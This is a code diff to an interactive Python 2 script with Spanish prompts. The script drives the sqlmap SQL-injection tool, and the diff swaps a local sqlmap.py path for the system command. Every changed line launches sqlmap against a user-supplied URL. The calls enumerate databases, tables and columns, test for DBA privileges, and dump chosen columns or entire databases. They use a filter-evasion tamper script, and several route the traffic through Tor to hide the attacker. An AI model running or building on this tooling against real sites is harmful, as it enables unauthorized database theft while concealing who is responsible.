@@ -91,14 +91,14 @@ def sqlinorm():
     urlglob()
     lev()
     rsk()
-    subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
+    subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
     postsqlin()
     
 def sqlitor():
     urlglob()
     lev()
     rsk()
-    subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
+    subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dbs"])
     postsqlin()
 
 def sqlipost():
@@ -109,7 +109,7 @@ def sqlipost():
         postglob()
         lev()
         rsk()
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
         postsqlip()
     else:
         checker.cRojo("La URL esta vacia, intentalo de nuevo.\n")
@@ -123,7 +123,7 @@ def sqlipostor():
         postglob()
         lev()
         rsk()
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dbs"])
         postsqlip()
     else:
         checker.cRojo("La URL esta vacia, intentalo de nuevo.\n")
@@ -132,9 +132,9 @@ def sqlipostor():
 def postdb(mode):
     db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
     if db != "" and mode == "normalsqli":
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"--tables"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"--tables"])
     elif db != "" and mode == "postsqli":
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"--tables"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"--tables"])
     else:
         postdb()
 
@@ -142,9 +142,9 @@ def posttables(mode):
     db=raw_input("Introduce el nombre de la DataBase que quieres extraer las tablas: ")
     table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
     if db != "" and table != "" and mode == "normalsqli":
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"--columns"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"--columns"])
     elif db != "" and table != "" and mode == "postsqli":
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"-T",table,"--columns"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"-T",table,"--columns"])
     else:
         posttables()
 
@@ -153,9 +153,9 @@ def postcolumns(mode):
     table=raw_input("Introduce el nombre de la tabla que quieres extraer la columnas: ")
     columns=raw_input("Introduce el nombre de la columna que quieres extraer los datos, o columnas separadas por coma si son varias: ")
     if db != "" and table != "" and columns != "" and mode == "normalsqli":
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"-C",columns,"--dump"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"-D",db,"-T",table,"-C",columns,"--dump"])
     elif db != "" and table != "" and columns != "" and mode == "postsqli":
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"-T",table,"-C",columns,"--dump"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"-D",db,"-T",table,"-C",columns,"--dump"])
     else:
         postcolumns()
 
@@ -163,7 +163,7 @@ def isdba(mode):
     if mode == "normalsqli":
         checker.cAmarillo("Comprobando si el usuario actual es root de MySQL ...")
         outp = open("modules/sqlopt/output.txt", "w")
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--batch","--is-dba"],stdout=outp)
+        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--batch","--is-dba"],stdout=outp)
         if 'current user is DBA:    False' in open('modules/sqlopt/output.txt').read():
             print "El usuario no es root."
             outp.close()
@@ -177,7 +177,7 @@ def isdba(mode):
     elif mode == "postsqli":
         checker.cAmarillo("Comprobando si el usuario actual es root de MySQL ...")
         outp = open("modules/sqlopt/output.txt", "w")
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--batch","--is-dba"],stdout=outp)
+        subprocess.call(["sqlmap","--tamper=bluecoat","--proxy","socks5://localhost:9050","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--batch","--is-dba"],stdout=outp)
         if 'current user is DBA:    False' in open('modules/sqlopt/output.txt').read():
             print "El usuario no es root."
             outp.close()
@@ -199,9 +199,9 @@ def dumpall(mode):
     """)
     decide=raw_input("Deseas continuar? (y/n): ")
     if decide == "y" and mode == "normalsqli":
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dump-all"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--dump-all"])
     elif decide == "y" and mode == "postsqli":
-        subprocess.call(["python2",HOME+"/.sqlmap/sqlmap.py","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dump-all"])
+        subprocess.call(["sqlmap","--tamper=bluecoat","--technique=BEUST","--level",level,"--risk",risk,"-u",url,"--data",post,"--dump-all"])
     elif decide == "n":
         print "Saliendo."
     else:
